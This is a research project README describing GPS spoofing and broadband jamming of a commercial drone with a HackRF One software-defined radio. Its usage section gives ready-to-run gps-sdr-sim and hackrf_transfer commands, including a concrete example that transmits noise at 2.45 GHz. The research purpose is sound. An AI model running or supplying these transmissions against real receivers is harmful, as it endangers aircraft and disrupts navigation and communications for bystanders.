# SDR-Based-Attacks
GPS spoofing and jamming attacks with the use of the HackRF One SDR.

SDR-Based GPS Spoofing Attacks on Commercial Drones 

Introduction 

This project explores the vulnerability of commercial drones to GPS spoofing attacks, focusing on the Autel EVO Nano Plus model. By employing a software-defined radio (SDR), this research investigates how counterfeit GPS signals can disrupt drone navigation, posing significant risks in both civilian and military contexts. 

Requirements 

    Hardware: HackRF One, ANT500 telescopic antenna (for GPS spoofing attack), Alfa Network APA-M25 directional panel antenna (for broadband jamming attack). 

    Software: GPS-SDR-SIM, HackRF Tools, Ubuntu operating system (Note: HackRF One does not support Windows OS for transmitting). 

    Dependencies: Ephemeris file for GPS data (downloadable from NASA’s CDDIS website and must be the file for day of transmission). 

Installation 

    Set up your Ubuntu environment to ensure all software dependencies are properly installed. 

    Connect your HackRF One device and ensure it is functioning with the provided software tools. 

Usage 

To perform a GPS spoofing attack: 

    Download and unzip the ephemeris file on the day of testing to ensure it contains current data. 

    Generate the counterfeit GPS signal using the command: 

    ./gps-sdr-sim -b [bits per sample] -s [sample rate] -e [navigation file] -l [latitude],[longitude],[altitude]  

    Transmit the spoofed signal via HackRF One using: 

    hackrf_transfer -t [file] -f 1575420000 -s [sample rate] -a 1 -x [tx_gain] -R 

    Ex. hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 40 -R 

 

 

To perform a broadband jamming attack that targets the controller's connection: 

    Determine target frequency, this will likely be 2.4GHz, 5.2GHz, or 5.8GHz. 

    The hackrf_sweep tool may be used to determine signal. 

    Transmit broadband noise jamming signal 

    hackrf_transfer -f [target frequency] -s [sample rate] -a [enables RF amplifier, 1 = enabled] -x [transmit gain] -t [input file for transmission] 

    Ex. hackrf_transfer -f 2450000000 -s 20000000 -a 1 -x 47 -t /dev/urandom 

 

HackRF Tools Documentation 

Configuration 

Adjust the transmitting frequency and power according to your local GNSS specifications and required spoofing range. 

Authors 

    Aidan Lenz 

    Dr. Shadi Sadeghpour 

References 

    Kerns, A. J., Shepard, D. P., Bhatti, J. A., & Humphreys, T. E. (2014). Unmanned Aircraft Capture and Control Via GPS Spoofing. Journal of Field Robotics, 31(4), 617–636. https://doi.org/10.1002/rob.21513 

    Khan, S. Z., Mohsin, M., & Iqbal, W. (2021). On GPS spoofing of aerial platforms: a review of threats, challenges, methodologies, and future research directions. PeerJ Computer Science, 7, e507. https://doi.org/10.7717/peerj-cs.507 

    Renyu, Z., Kiat, S. C., Kai, W., & Heng, Z. (2018). Spoofing Attack of Drone. 2018 IEEE 4th International Conference on Computer and Communications (ICCC), Dec. 2018, doi: https://doi.org/10.1109/compcomm.2018.8780865. 

Contact 

ALenz@student.citadel.edu 

 

 
